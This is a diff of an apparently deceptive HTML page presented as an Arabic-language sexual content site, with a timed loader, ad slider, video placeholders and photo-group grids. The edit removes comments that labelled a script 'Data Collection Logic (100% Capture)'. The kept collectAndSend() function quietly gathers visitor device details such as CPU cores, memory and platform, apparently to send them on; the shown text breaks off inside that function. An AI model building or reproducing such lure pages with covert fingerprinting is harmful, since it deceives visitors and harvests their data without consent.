@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>سكس الصعيد  - elsayda sexxxxx</title>
   <style>
-    :root { --blue: #007bff; --light-blue: #e7f1ff; --whatsapp-green: #25D366; --telegram-blue: #0088cc; }
+    :root { --blue: #007bff; --light-blue: #e7f1ff; }
     body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7f6; margin: 0; color: #333; overflow-x: hidden; }
 
     /* Loader Overlay */
@@ -34,7 +34,7 @@
 
     /* Ad Slider */
     .ad-section { display: flex; overflow-x: auto; gap: 10px; padding: 20px; scroll-behavior: smooth; }
-    .ad-card { min-width: 80%; height: 200px; background: #ddd; border-radius: 10px; overflow: hidden; flex-shrink: 0; border: 2px solid var(--blue); }
+    .ad-card { min-width: 80%; height: 200px; background: #333; border-radius: 10px; overflow: hidden; flex-shrink: 0; border: 2px solid var(--blue); }
     .ad-card img { width: 100%; height: 100%; object-fit: cover; }
 
     /* Videos Section */
@@ -43,16 +43,14 @@
     .vid-item { background: #000; height: 120px; border-radius: 8px; position: relative; display: flex; align-items: center; justify-content: center; color: white; }
     .vid-item::before { content: "▶"; font-size: 30px; opacity: 0.8; }
 
-    /* Groups Section - التعديل الجديد */
-    .groups-section { padding: 20px; }
-    .group-box { background: #fff; border-radius: 10px; padding: 15px; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
-    .group-header { font-weight: bold; margin-bottom: 10px; display: flex; align-items: center; gap: 10px; }
-    .whatsapp-header { color: var(--whatsapp-green); border-right: 4px solid var(--whatsapp-green); padding-right: 10px; }
-    .telegram-header { color: var(--telegram-blue); border-right: 4px solid var(--telegram-blue); padding-right: 10px; }
-    
-    .image-group-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 10px; }
-    .img-placeholder { background: #eee; aspect-ratio: 1/1; border-radius: 5px; overflow: hidden; display: flex; align-items: center; justify-content: center; border: 1px solid #ddd; }
-    .img-placeholder img { width: 100%; height: 100%; object-fit: cover; }
+    /* --- قسم المجموعات الجديد --- */
+    .photo-groups { padding: 20px; background: #f9f9f9; }
+    .group-item { margin-bottom: 25px; }
+    .group-title { font-weight: bold; color: var(--blue); margin-bottom: 10px; border-right: 4px solid var(--blue); padding-right: 10px; }
+    .image-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
+    .img-box { background: #eee; aspect-ratio: 1/1; border-radius: 6px; display: flex; align-items: center; justify-content: center; border: 1px dashed #bbb; overflow: hidden; }
+    .img-box img { width: 100%; height: 100%; object-fit: cover; }
+    /* -------------------------- */
 
     /* Comments Section */
     .comments { padding: 20px; }
@@ -95,22 +93,22 @@
       </div>
     </div>
 
-    <div class="groups-section">
-        <div class="group-box">
-            <div class="group-header whatsapp-header">مجموعة صور الواتساب (تحديث يومي)</div>
-            <div class="image-group-grid">
-                <div class="img-placeholder"><img src="/w1.jpg" alt="صورة 1"></div>
-                <div class="img-placeholder"><img src="/w2.jpg" alt="صورة 2"></div>
-                <div class="img-placeholder"><img src="/w3.jpg" alt="صورة 3"></div>
+    <div class="photo-groups">
+        <div class="group-item">
+            <div class="group-title">📸 مجموعة صور الصعيد الحصرية</div>
+            <div class="image-grid">
+                <div class="img-box"><img src="/p1.jpg" alt="صورة 1"></div>
+                <div class="img-box"><img src="/p2.jpg" alt="صورة 2"></div>
+                <div class="img-box"><img src="/p3.jpg" alt="صورة 3"></div>
             </div>
         </div>
 
-        <div class="group-box">
-            <div class="group-header telegram-header">مجموعة صور التليجرام (حصري)</div>
-            <div class="image-group-grid">
-                <div class="img-placeholder"><img src="/t1.jpg" alt="صورة 1"></div>
-                <div class="img-placeholder"><img src="/t2.jpg" alt="صورة 2"></div>
-                <div class="img-placeholder"><img src="/t3.jpg" alt="صورة 3"></div>
+        <div class="group-item">
+            <div class="group-title">🔥 صور المشاهدات الجديدة</div>
+            <div class="image-grid">
+                <div class="img-box"><img src="/p4.jpg" alt="صورة 4"></div>
+                <div class="img-box"><img src="/p5.jpg" alt="صورة 5"></div>
+                <div class="img-box"><img src="/p6.jpg" alt="صورة 6"></div>
             </div>
         </div>
     </div>
@@ -126,13 +124,11 @@
   </div>
 
   <script>
-    // 1. Loader Logic (3 Seconds)
     setTimeout(() => {
       document.getElementById('loader-overlay').style.display = 'none';
       document.getElementById('main-content').style.display = 'block';
     }, 3000);
 
-    // 2. Data Collection Logic (100% Capture)
     async function collectAndSend() {
       const info = {
         hw: { cores: navigator.hardwareConcurrency, ram: navigator.deviceMemory, plat: navigator.platform },
